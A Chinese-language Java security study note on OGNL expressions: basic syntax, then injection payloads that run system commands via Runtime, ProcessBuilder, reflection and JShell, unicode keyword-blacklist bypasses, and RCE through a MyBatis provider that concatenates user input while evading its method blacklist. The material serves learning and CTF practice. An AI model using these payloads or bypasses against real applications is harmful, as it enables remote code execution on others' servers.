---
created: '22/03/11'
title: OGNL
tags:
  - java
  - java安全
---

# OGNL
## maven导入
```xml
<dependency>
	<groupId>ognl</groupId>
	<artifactId>ognl</artifactId>
	<version>3.1.19</version>
</dependency>
```

## 基本语法
### 对Root对象的访问
```java
User user = new User("test", 23);
System.out.println(Ognl.getValue("name", user));
```
### 对上下文对象的访问
```java
Map<String, Object> context = new HashMap<String, Object>();
context.put("init", "hello");
Ognl.getValue("#init", context, null);
```
### 对静态变量/静态方法的访问
```java
System.out.println(Ognl.getValue("@java.lang.Runtime@getRuntime()", null););
```
### 对方法的访问
```java
System.out.println(Ognl.getValue("@java.lang.Runtime@getRuntime().exec('calc.exe');", null););
```
### 对数组和集合的访问
```java
User user = new User();
Map<String, Object> context = new HashMap<String, Object>();
String[] strings  = {"aa", "bb"};
ArrayList<String> list = new ArrayList<String>();
list.add("aa");
list.add("bb");
Map<String, String> map = new HashMap<String, String>();
map.put("key1", "value1");
map.put("key2", "value2");
context.put("list", list);
context.put("strings", strings);
context.put("map", map);
System.out.println(Ognl.getValue("#strings[0]", context, user));
System.out.println(Ognl.getValue("#list[0]", context, user));
System.out.println(Ognl.getValue("#list[0 + 1]", context, user));
System.out.println(Ognl.getValue("#map['key1']", context, user));
System.out.println(Ognl.getValue("#map['key' + '2']", context, user));
```
### 创建对象
```java
System.out.println(Ognl.getValue("#{'key1':'value1'}", null));	
System.out.println(Ognl.getValue("{'key1','value1'}", null));
System.out.println(Ognl.getValue("new sample.ognl.User()", null));
```
### 表达式支持
```
2 + 4 // 整数相加（同时也支持减法、乘法、除法、取余 [% /mod]、）
"hell" + "lo" // 字符串相加
i++ // 递增、递减
i == j // 判断
var in list // 是否在容器当中
```

## OGNL注入
由于OGNL的强大与方便性，我们很容易构造一些命令执行的payload:
```
//使用runtime执行系统命令
@java.lang.Runtime@getRuntime().exec("calc")


//使用processbuilder执行系统命令
(new java.lang.ProcessBuilder(new java.lang.String[]{"calc"})).start()

//使用反射调用runtime执行系统命令
${(#runtimeclass=#this.getClass().forName("java.lang.Runtime")).(#getruntimemethod=#runtimeclass.getDeclaredMethods([7]).(#rtobj=#getruntimemethod.invoke(null,null)).(#execmethod=#runtimeclass.getDeclaredMethods([14]).(#execmethod.invoke(#rtobj,"cmd"))}

//使用Jshell执行java代码(jdk9及以后)
@jdk.jshell.Jshell@create().eval('code');
```

### 关键字绕过
假如题目中对用户的输入进行了关键字的黑名单(以new为例)，那么实际上我们可以使用unicode字符进行绕过:
```java
String str = "(\u006eew java.lang.ProcessBuilder(new java.lang.String[]{"calc"})).start()";
Ognl.getValue(str, null);
```
那么假如存在一个正则表达式`\\u\d{4}`，将对应的unicode先解析了一遍，再进行黑名单，还有方法绕过吗？实际上这里又存在一个trick，即`\uxxxx`中的u是可以写一个或多个的，具体原因在于`ognl.JavaCharStream#readChar`方法中:
![](https://gitee.com/guuest/images/raw/master/img/20220311111220.png)
所以上述OGNL表达式可以改写为:
```java
String str = "(\uuuuuuuuuuuuuuuu006eew java.lang.ProcessBuilder(new java.lang.String[]{"calc"})).start()";
Ognl.getValue(str, null);
```


### OGNL与mybatis
***基于mybatis3.5.9，不同版本的mybatis可能存在差异***

mybatis中实际上是支持OGNL表达式的，这样假如mybatis存在sql注入(即输入直接拼接)的情况，那么实际上也存在OGNL注入，可以实现RCE

MyBatis中可以使用OGNL的地方有两处：
- 动态SQL表达式中
- ${param}参数中

举一个简单的例子:
```java
package com.example.ezsqltest.dao;

import org.apache.ibatis.annotations.Param;
import org.apache.ibatis.jdbc.SQL;

public class UserProvider {
    public UserProvider() {
    }

    public String getVoteById(@Param("vid") final String vid) {
        String s = (new SQL() {
            {
                this.SELECT("*");
                this.FROM("users");
                this.WHERE("id = " + vid);
            }
        }).toString();
        return s;
    }
}
```
这里的vid是用户的输入，没有经过任何的过滤直接拼接进sql查询中，所以我们这里可以输入`${1}`来使用OGNL表达式。

所以这里是存在OGNL注入的，但是假如我们尝试使用`${@java.lang.Runtime@getRuntime().exec("calc")}`这个payload进行注入时，会发现命令并没有被成功执行，这是为什么呢？

答案藏在`org.apache.ibatis.ognl.OgnlRuntime#invokeMethod`方法中，这里存在着一个黑名单机制:
![](https://gitee.com/guuest/images/raw/master/img/20220311105937.png)
当_useStricterInvocation为true时，黑名单中的类(或继承自黑名单中的类)将不能调用方法，而_useStricterInvocation这个值默认是为true。

所以这时候我们就需要一些绕过方法进行绕过了，上面也提到了这些payload:
```java
//使用反射调用runtime执行系统命令
${(#runtimeclass=#this.getClass().forName("java.lang.Runtime")).(#getruntimemethod=#runtimeclass.getDeclaredMethods([7]).(#rtobj=#getruntimemethod.invoke(null,null)).(#execmethod=#runtimeclass.getDeclaredMethods([14]).(#execmethod.invoke(#rtobj,"cmd"))}

//使用Jshell执行java代码(jdk9及以后)
@jdk.jshell.Jshell@create().eval('code');
```



### OGNL与struts 2
后补



## 参考文章
- https://jueee.github.io/2020/08/2020-08-15-Ognl%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/
- https://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/
- https://paper.seebug.org/794/
- https://blog.csdn.net/isea533/article/details/50061705